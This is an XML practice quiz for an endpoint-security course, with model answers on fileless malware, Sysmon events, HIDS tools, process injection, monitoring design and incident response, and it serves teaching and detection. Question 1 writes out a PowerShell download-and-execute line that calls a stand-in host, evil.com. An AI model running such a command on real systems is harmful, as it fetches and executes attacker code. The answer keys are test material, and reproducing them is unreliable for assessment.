@@ -1,0 +1,299 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<quiz>
+  <title>Final Practice Quiz: Endpoint Security Technologies</title>
+  <session>05</session>
+  <type>final-practice</type>
+  <time_minutes>35</time_minutes>
+  <description>Exam preparation with short and long answer questions for Session 05</description>
+
+  <!-- SHORT ANSWER QUESTIONS -->
+
+  <question id="1" type="short_answer" points="5">
+    <text>Explain the difference between fileless malware and traditional (file-based) malware. Give ONE specific example of how fileless malware executes and why it is harder to detect.</text>
+    <model_answer>
+      Traditional malware writes an executable file to disk (e.g., a .exe or .dll), which can be scanned and detected by AV signature matching. Fileless malware executes entirely in memory without writing malicious files to disk — the malicious code exists only in RAM during execution.
+
+      Example: An attacker sends a phishing email. The user opens a Word document with a macro. The macro runs: IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1') — this downloads a PowerShell script and executes it directly in memory using Invoke-Expression (IEX). The script runs shellcode injected into a legitimate process (e.g., svchost.exe). At no point is a malicious file written to disk.
+
+      Why harder to detect: AV file scanning has no file to scan. On reboot, the payload is gone (though the mechanism that launched it, like the macro, may remain). Detection requires behavioral monitoring (EDR, Script Block Logging) rather than file scanning.
+    </model_answer>
+    <key_concepts>
+      <concept>No file on disk — memory-only execution</concept>
+      <concept>IEX/DownloadString as common delivery mechanism</concept>
+      <concept>Process injection for persistence in memory</concept>
+      <concept>Bypasses AV file scanning; requires behavioral detection</concept>
+    </key_concepts>
+    <mitre_technique>T1059.001 — PowerShell, T1055 — Process Injection</mitre_technique>
+    <difficulty>intermediate</difficulty>
+  </question>
+
+  <question id="2" type="short_answer" points="5">
+    <text>A Windows system generates Event ID 4698 (Scheduled Task Created) at 3:15 AM. The task name is \Microsoft\Windows\CryptSvc\Update and the action is: C:\ProgramData\Microsoft\Crypto\update.exe /q /autorun. Identify THREE red flags in this event and explain why each is suspicious.</text>
+    <model_answer>
+      Red Flag 1 — Time of creation (3:15 AM): Scheduled tasks are typically created by IT administrators during business hours or during automated deployments. A task created at 3:15 AM is highly anomalous — this is when attackers operate to avoid detection by human operators.
+
+      Red Flag 2 — Task name mimics a legitimate system task: \Microsoft\Windows\CryptSvc\Update is designed to look like a legitimate Windows Cryptographic Services update task. Legitimate Microsoft tasks follow specific naming patterns and are present in the OS install; they are not dynamically created. A task path under \Microsoft\Windows\ for something not in the OS baseline is masquerading.
+
+      Red Flag 3 — Executable in ProgramData with suspicious path: C:\ProgramData\Microsoft\Crypto\update.exe is in a user-writable location (ProgramData) and has a name (update.exe) designed to seem legitimate. Legitimate Windows executables reside in C:\Windows\ or C:\Program Files\, not in ProgramData. The /q /autorun flags suggest silent execution without any user interface.
+
+      (Any three of these, plus any additional valid flag, receives full credit.)
+    </model_answer>
+    <key_concepts>
+      <concept>Off-hours task creation as indicator</concept>
+      <concept>Task name masquerading as legitimate Microsoft task</concept>
+      <concept>Executable in user-writable location (ProgramData)</concept>
+      <concept>Silent/hidden execution flags (/q)</concept>
+    </key_concepts>
+    <mitre_technique>T1053.005 — Scheduled Task, T1036.004 — Masquerade Task or Service</mitre_technique>
+    <difficulty>intermediate</difficulty>
+  </question>
+
+  <question id="3" type="short_answer" points="5">
+    <text>What is the purpose of Sysmon Event ID 22 (DNS Event), and how can it be used to detect C2 (Command and Control) communication? Give a realistic detection scenario.</text>
+    <model_answer>
+      Sysmon Event 22 captures DNS query events from processes on the system — it logs which process made a DNS query, the domain name queried, the query type, and the response. This provides per-process DNS visibility that is not available from network-level DNS monitoring alone.
+
+      C2 detection use case: Many C2 frameworks use DNS for beaconing — the infected host periodically resolves the attacker's domain to receive commands (DNS C2) or simply to verify connectivity and get the C2 IP. Event 22 captures these queries with the source process, enabling correlation.
+
+      Realistic scenario: Event 22 shows that wuhelper.exe (a dropped malware binary in AppData\Roaming) is making DNS queries to evil-cdn.net every 60 seconds. The regular interval (beaconing) and the low TTL of the domain (newly registered) are both suspicious. A detection rule: ANY process in AppData, Temp, or ProgramData making repeated DNS queries to the same domain at regular intervals → C2 beaconing alert. This would not be visible from endpoint logs without Sysmon Event 22.
+    </model_answer>
+    <key_concepts>
+      <concept>Per-process DNS visibility (which process made which DNS query)</concept>
+      <concept>Beaconing detection: regular interval queries from malware</concept>
+      <concept>Correlation with process reputation (AppData/Temp locations)</concept>
+      <concept>Newly registered domains as C2 indicator</concept>
+    </key_concepts>
+    <mitre_technique>T1071.004 — Application Layer Protocol: DNS</mitre_technique>
+    <difficulty>intermediate</difficulty>
+  </question>
+
+  <question id="4" type="short_answer" points="5">
+    <text>Compare OSSEC and Wazuh as HIDS. What does Wazuh add beyond OSSEC capabilities? In what scenario would you choose one over the other?</text>
+    <model_answer>
+      OSSEC is a mature open-source HIDS providing file integrity monitoring (FIM), log analysis, rootkit detection, and active response via a central manager with distributed agents. It uses a proprietary log format and management interface.
+
+      Wazuh is a fork of OSSEC that adds significantly enhanced capabilities: native Elastic Stack integration (Elasticsearch + Kibana dashboards), REST API for automation and programmatic management, MITRE ATT&CK mapping of alerts, vulnerability detection against NVD, Security Configuration Assessment (CIS benchmark compliance checking), cloud provider integrations (AWS, Azure, GCP), Docker and Kubernetes monitoring, and regulatory compliance frameworks (PCI-DSS, HIPAA, GDPR).
+
+      Choose OSSEC when: The environment is very resource-constrained, you need a proven lightweight solution, or you have an existing OSSEC deployment and need only minimal enhancement.
+
+      Choose Wazuh when: You need modern SIEM integration (Elastic Stack), compliance reporting, vulnerability management, MITRE ATT&CK correlation, or cloud workload monitoring. Wazuh is the default choice for new deployments due to its significantly richer feature set and active development.
+    </model_answer>
+    <key_concepts>
+      <concept>OSSEC: FIM, log analysis, rootkit detection, active response</concept>
+      <concept>Wazuh extends OSSEC with Elastic integration, API, MITRE mapping</concept>
+      <concept>Vulnerability detection and compliance in Wazuh</concept>
+      <concept>Wazuh preferred for new deployments; OSSEC for legacy/minimal environments</concept>
+    </key_concepts>
+    <difficulty>basic</difficulty>
+  </question>
+
+  <question id="5" type="short_answer" points="5">
+    <text>Explain the concept of process injection in the context of endpoint security. Name TWO different process injection sub-techniques, describe how each works, and identify which Sysmon events would detect each.</text>
+    <model_answer>
+      Process injection is a technique where an attacker causes malicious code to execute within the memory space of a legitimate, trusted process. This evades detection because the malicious activity appears to originate from a legitimate process (e.g., svchost.exe, explorer.exe).
+
+      Sub-technique 1 — DLL Injection (T1055.001):
+      How it works: The attacker opens a handle to a target process, allocates memory in that process, writes the path of a malicious DLL, and creates a remote thread that calls LoadLibrary() to load the DLL. The DLL code then runs within the target process.
+      Detection: Sysmon Event 8 (CreateRemoteThread) fires when CreateRemoteThread() is called. Sysmon Event 7 (Image Loaded) captures the DLL load event showing the malicious DLL being loaded by a legitimate process.
+
+      Sub-technique 2 — Process Hollowing (T1055.012):
+      How it works: A legitimate process (e.g., svchost.exe) is created in a SUSPENDED state. Its original executable code is unmapped from memory. Malicious code is written into the process memory space. The thread context is modified to point to the malicious code. The process is then resumed, now running malicious code under the identity of svchost.exe.
+      Detection: Sysmon Event 25 (ProcessTampering) detects some hollowing scenarios. Behavioral anomaly detection (svchost.exe with unexpected network connections or child processes) provides complementary detection.
+    </model_answer>
+    <key_concepts>
+      <concept>Process injection: malicious code runs under legitimate process identity</concept>
+      <concept>DLL injection via CreateRemoteThread + LoadLibrary</concept>
+      <concept>Process hollowing via CREATE_SUSPENDED + memory replacement</concept>
+      <concept>Sysmon Event 8 (CreateRemoteThread) and Event 25 (ProcessTampering)</concept>
+    </key_concepts>
+    <mitre_technique>T1055.001 — DLL Injection, T1055.012 — Process Hollowing</mitre_technique>
+    <difficulty>advanced</difficulty>
+  </question>
+
+  <!-- LONG ANSWER QUESTIONS -->
+
+  <question id="6" type="long_answer" points="15">
+    <text>Endpoint Monitoring Architecture Design: Design a complete endpoint security monitoring architecture for a mid-sized company (500 workstations, 50 servers including 3 Domain Controllers, 20 Linux servers). Address: (a) monitoring tools per endpoint type, (b) specific events/logs to collect, (c) telemetry flow to SIEM, (d) top 5 detection rules, (e) one anti-pattern to avoid.</text>
+    <model_answer>
+      a) MONITORING TOOLS PER ENDPOINT TYPE:
+
+      Windows Workstations (500):
+      - Sysmon (with community config, e.g., SwiftOnSecurity): process, network, registry, DNS, LSASS monitoring
+      - Windows Event Forwarding (WEF) for Security and System logs
+      - EDR agent if budget permits (e.g., Microsoft Defender for Endpoint — included in M365 E5)
+      - Wazuh agent: FIM on system files, vulnerability detection
+
+      Windows Servers (30, including Domain Controllers):
+      - All workstation tools, PLUS:
+      - Enhanced Sysmon config for server-specific patterns (DC: DCSync detection, file server: mass file access)
+      - Domain Controllers specifically: Privileged Access Workstation (PAW) model; enhanced audit policy for Kerberos events (4768, 4769, 4771)
+      - Wazuh with FIM on critical system files
+
+      Linux Servers (20):
+      - auditd with security-focused rules (execve, identity changes, network connect, cron, SSH keys)
+      - Wazuh agent (integrates with auditd, adds FIM and rootkit detection)
+      - osquery for fleet-level queries and anomaly detection
+      - rsyslog for centralized forwarding of auth.log, syslog
+
+      b) SPECIFIC EVENTS/LOGS:
+
+      Windows — Priority 1 (all systems):
+      - Security log: 4624, 4625, 4648, 4688 (with cmdline), 4698, 4719, 7045
+      - Sysmon Events: 1, 3, 8, 10, 11, 13, 22, 25
+      - Domain Controllers add: 4768, 4769, 4771, 4776, 4662
+
+      Windows — Priority 2 (servers only):
+      - PowerShell: Event 4104 (Script Block Logging)
+      - System log: 7036 (Service state changes)
+
+      Linux auditd rules (minimum):
+      - -a always,exit -F arch=b64 -S execve -k exec_commands
+      - -w /etc/passwd -p wa -k identity
+      - -w /etc/shadow -p wa -k identity
+      - -w /etc/sudoers -p wa -k sudoers
+      - -w /root/.ssh/ -p wa -k ssh_keys
+      - -w /etc/cron.d/ -p wa -k cron
+      - -a always,exit -F arch=b64 -S connect -k network_connect
+
+      c) TELEMETRY FLOW:
+
+      Windows:
+      - Sysmon events → Windows Event Log → Winlogbeat/NXLog → Logstash → SIEM
+      - Or: WEF → Windows Event Collector → Winlogbeat → SIEM
+      - Encryption: TLS 1.2+ for all log transport
+
+      Linux:
+      - auditd → audisp (syslog plugin) → rsyslog → Logstash → SIEM
+      - Or: Wazuh agent → Wazuh manager → Elastic stack
+
+      SIEM considerations:
+      - Normalize to ECS (Elastic Common Schema) or OCSF
+      - Hot storage: 90 days (fast SSD for active investigation)
+      - Warm storage: 1 year (slower storage, searchable)
+      - Cold/archive: 3+ years (compliance retention)
+      - Daily ingest estimate: ~50GB/day for 500 endpoints
+
+      d) TOP 5 DETECTION RULES (highest ROI):
+
+      Rule 1: Office Application Spawns Scripting Engine (T1059.001)
+      - Parent: WINWORD/EXCEL/POWERPNT/OUTLOOK spawns powershell/cmd/wscript
+      - Alert: Critical | False Positive Rate: Very Low
+
+      Rule 2: LSASS Memory Access by Non-System Process (T1003.001)
+      - Sysmon E10: TargetImage=lsass.exe AND SourceImage not in approved list
+      - Alert: Critical | False Positive Rate: Low
+
+      Rule 3: Brute Force then Success (T1110.001)
+      - 5+ Event 4625 from same source within 5 minutes, followed by 4624
+      - Alert: Critical | False Positive Rate: Low
+
+      Rule 4: Executable Created in Temp/AppData (T1105)
+      - Sysmon E11: PE file created in user-writable paths (Temp, AppData, ProgramData)
+      - Alert: Medium | Needs tuning for software installers
+
+      Rule 5: Scheduled Task Created with Suspicious Path (T1053.005)
+      - Event 4698 with TaskContent containing Temp/AppData/ProgramData paths
+      - Alert: High | False Positive Rate: Low
+
+      e) ANTI-PATTERN TO AVOID:
+
+      Anti-pattern: Collecting everything without a consumption strategy.
+      Many organizations deploy Sysmon + full auditd + EDR and pipe all logs to SIEM without creating detection rules. The result is a system generating 100GB+/day of data with no alerts, giving the false sense of security of "we collect everything." The investment should prioritize detection rules, alert tuning, and analyst capacity over raw collection volume. Collect what you can act on; tune rules before expanding collection scope.
+    </model_answer>
+    <key_concepts>
+      <concept>Tool selection per endpoint type with justification</concept>
+      <concept>Specific Event IDs and auditd rules (not generic)</concept>
+      <concept>Log shipping pipeline with encryption</concept>
+      <concept>Detection rules ranked by ROI</concept>
+      <concept>Anti-pattern: collection without consumption</concept>
+    </key_concepts>
+    <difficulty>advanced</difficulty>
+  </question>
+
+  <question id="7" type="long_answer" points="15">
+    <text>Incident Response Using Endpoint Evidence: At 14:22 UTC, your SIEM generates a CRITICAL alert about LSASS memory access by wuagent.exe on DC01.corp.local, parent powershell.exe with encoded command, running as backup_svc, with a prior RDP session from FILESERVER02 10 minutes earlier. Answer: (a) triage, (b) scope, (c) attack chain reconstruction, (d) immediate response actions, (e) detection gaps.</text>
+    <model_answer>
+      a) TRIAGE — TRUE POSITIVE, Confidence: 99%
+
+      Evidence supporting true positive:
+      - wuagent.exe in C:\Windows\Temp\ — legitimate Windows Update agents are in C:\Windows\System32\, never Temp
+      - Parent is powershell.exe with -enc flag (encoded command) — the encoded command hides the payload
+      - Target is lsass.exe with 0x1FFFFF (PROCESS_ALL_ACCESS) — this is definitively credential dumping; no legitimate process requests this access level
+      - A service account (backup_svc) running PowerShell on a DC is abnormal — backup service accounts don't execute PowerShell interactively
+      - The RDP session from FILESERVER02 (10 minutes prior) is also suspicious — backup service accounts don't normally RDP to DCs
+
+      This is a nearly certain true positive. The only investigation needed is confirming scope, not confirming the alert itself.
+
+      b) SCOPE — Worst-Case Implications:
+
+      If the LSASS dump succeeded on the Domain Controller:
+      - All Active Directory password hashes extracted (every user in the domain)
+      - krbtgt hash potentially extracted → enables Golden Ticket forgery → permanent domain-wide access
+      - Machine account passwords for all domain-joined systems → enables Silver Ticket attacks
+      - All service account credentials → direct access to databases, backup systems, email servers
+
+      Additional potentially affected systems:
+      - FILESERVER02 (confirmed lateral movement source — RDP from here)
+      - Any system backup_svc has access to (backup server, all systems in backup scope)
+      - All domain-joined systems (if Golden Ticket was created)
+      - The system where backup_svc credentials were originally compromised (unknown — must investigate)
+
+      c) ATTACK CHAIN RECONSTRUCTION:
+
+      Known:
+      1. [Unknown time] — Initial compromise at some point gave attacker code execution with backup_svc credentials or ability to impersonate backup_svc
+      2. [Unknown] — Attacker accessed FILESERVER02 somehow (lateral movement)
+      3. [14:12 UTC] — backup_svc RDP session established to DC01 from FILESERVER02
+      4. [14:12-14:22] — Attacker dropped wuagent.exe to C:\Windows\Temp\ on DC01
+      5. [~14:22] — PowerShell (encoded) launched wuagent.exe
+      6. [14:22] — LSASS credential dump attempt detected
+
+      Unknown / needs investigation:
+      - How was the initial foothold obtained? (Phishing? Exploit? Insider?)
+      - How was FILESERVER02 compromised?
+      - How did the attacker obtain backup_svc credentials?
+      - Did the LSASS dump succeed before EDR detection/blocking?
+      - What else was done in the 10 minutes between RDP logon and the alert?
+
+      d) IMMEDIATE RESPONSE ACTIONS (in order):
+
+      1. ISOLATE DC01 from network immediately (highest priority)
+      Reasoning: If DCSync or Golden Ticket creation is in progress or possible, every second DC01 is connected is a risk. Domain Controllers must be isolated before other systems because their compromise has domain-wide consequences.
+
+      2. Block 14:12–14:22 RDP session / terminate the backup_svc session on DC01
+      Reasoning: The attacker may still have an active session. Terminating it prevents further actions.
+
+      3. Isolate FILESERVER02
+      Reasoning: Confirmed as lateral movement staging point. May contain additional malicious tools or an active implant.
+
+      4. Disable backup_svc account in Active Directory
+      Reasoning: Compromised credential. Disabling it prevents any further authentication using this account while investigation proceeds.
+
+      5. Reset krbtgt password (twice, with 10-hour minimum gap)
+      Reasoning: If a Golden Ticket was created (uses krbtgt hash), rotating the krbtgt password twice invalidates all existing Kerberos tickets. This is the most impactful defensive action for DC compromise.
+
+      e) DETECTION GAPS AND FIXES:
+
+      Gap 1: No alert on RDP from FILESERVER02 to DC01 using a service account
+      Problem: Service accounts (backup_svc) should never use RDP interactively. An RDP login from a service account should be a high-priority alert.
+      Fix: Create a SIEM rule: Event 4624, LogonType=10, TargetUserName ENDS WITH '_svc' → Alert HIGH. Also consider using privileged access workstations (PAWs) for all DC administration.
+
+      Gap 2: No alert on PowerShell with encoded command on a Domain Controller
+      Problem: Domain Controllers should almost never run user-initiated PowerShell sessions. An encoded PowerShell command on a DC is a near-certain attack indicator.
+      Fix: Create rule: Event 4688 on DC01 where NewProcessName='powershell.exe' AND CommandLine CONTAINS '-enc' → Alert CRITICAL. Consider blocking PowerShell Constrained Language Mode on DCs.
+
+      Additional gap: The attacker successfully obtained backup_svc credentials before this alert. The detection chain failed earlier — the initial compromise (phishing, brute force, or another exploit) went undetected long enough for the attacker to reach a DC. Gap: No detection on the initial compromise path. Fix: deploy EDR on FILESERVER02 and all servers, not just DCs.
+    </model_answer>
+    <key_concepts>
+      <concept>True positive determination from multiple evidence factors</concept>
+      <concept>DC compromise = domain-wide impact assessment</concept>
+      <concept>Attack chain reconstruction with known/unknown sections</concept>
+      <concept>Prioritized response: DC isolation first, credential rotation</concept>
+      <concept>krbtgt double-reset for Golden Ticket mitigation</concept>
+      <concept>Detection gaps: service account RDP, encoded PS on DCs</concept>
+    </key_concepts>
+    <mitre_technique>T1003.001 — LSASS, T1021.001 — RDP, T1078 — Valid Accounts</mitre_technique>
+    <difficulty>advanced</difficulty>
+  </question>
+
+</quiz>
